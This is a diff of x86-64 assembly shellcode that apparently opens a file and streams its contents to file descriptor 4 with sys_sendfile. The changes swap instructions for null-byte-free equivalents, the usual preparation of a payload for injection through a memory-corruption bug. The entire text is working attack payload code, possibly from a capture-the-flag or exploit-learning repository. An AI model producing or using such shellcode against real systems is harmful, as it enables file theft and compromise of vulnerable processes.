@@ -1,7 +1,7 @@
 BITS 64
 GLOBAL _start
 _start:
-    jmp get_eip
+    jmp short get_eip
  
 run:
     xor rax, rax
@@ -17,16 +17,22 @@ run:
 
     ; sys_sendfile(int out_fd, int in_fd, off_t *offset, size_t count)
     mov rsi, rax    ; in_fd
-    mov eax, 0x28   ; sys_sendfile
-    mov r10, 0xFFF  ; size
+    xor rax, rax
+    add al, 0x28    ; sys_sendfile
+    xor rdi, rdi
+    dec di
+    mov r10, rdi
     xor rdi, rdi   
-    add edi, 4      ; out_fd
+    inc rdi
+    inc rdi
+    inc rdi
+    inc rdi         ; out_fd
     xor rdx,rdx     ; offset
     syscall
 
     ; sys_exit(return_code)
     xor rax, rax
-    add rax, 60  ; sys_exit
+    add al, 60  ; sys_exit
     xor rdi, rdi ; return 0 (success)
     syscall
  
